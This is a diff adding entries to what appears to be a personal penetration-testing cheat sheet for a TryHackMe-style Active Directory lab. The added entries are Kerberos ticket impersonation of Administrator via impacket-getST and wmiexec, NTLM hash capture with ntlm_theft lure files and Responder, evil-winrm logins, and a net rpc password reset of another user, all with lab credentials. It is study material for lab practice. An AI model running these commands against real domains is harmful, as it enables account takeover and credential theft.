@@ -80,6 +80,21 @@ The **`impacket-smbpasswd`** tool is part of the` Impacket` suite, used to chang
 impacket-smbpasswd DOMAIN/john.doe:oldpassword@192.168.1.10 -newpass NewPassword123!
 ```
 
+`getTST`
+
+```bash
+impacket-getST -spn "cifs/haystack.thm.corp" -impersonate "Administrator" "thm.corp/DARLA_WINTERS:newP@ssword2022"
+```
+
+`wmiexec`
+```bash
+export KRB5CCNAME=Administrator.ccache
+```
+
+```bash
+impacket-wmiexec -k -no-pass Administrator@haystack.thm.corp
+```
+
 ---
 
 ### `kerbrute`
@@ -119,6 +134,27 @@ smbclient //192.168.1.10/shared_folder -U username
 
 ---
 
+### `ntlm_theft`
+
+To catch `NTLM` hashes by a listnener
+```bash
+python ~/hacktools/ntlm_theft/ntlm_theft.py -g all -s 10.10.70.109 -f ee 
+```
+
+Responder, is the listener to catch the `NTLM` hashes
+```bash
+sudo responder -I tun0 -v
+```
+
+---
+### `EVILWINRM`
+
+```bash
+evil-winrm -i 10.10.113.103 -u 'AUTOMATE' -p 'Passw0rd1'
+```
+
+
+---
 
 ### bloodhound
 #### Neo4j
@@ -138,4 +174,11 @@ bloodhound-python -ns 10.10.149.218 --dns-tcp -d THM.CORP -u 'automate' -p 'Pass
 
 ---
 
+### `net rpc`
 
+This command is using **`net rpc`**, which is part of the **Samba suite**, to change the password of a user on a Windows machine or Active Directory domain over the **RPC (Remote Procedure Call)** protocol. Here’s a breakdown of what each part of the command does:
+
+```bash
+net rpc password "DARLA_WINTERS" "newP@ssword2022" -U CRUZ_HALL'%'newP@ssword2022' -I '10.10.113.103' -S "THM.CORP"
+```
+---
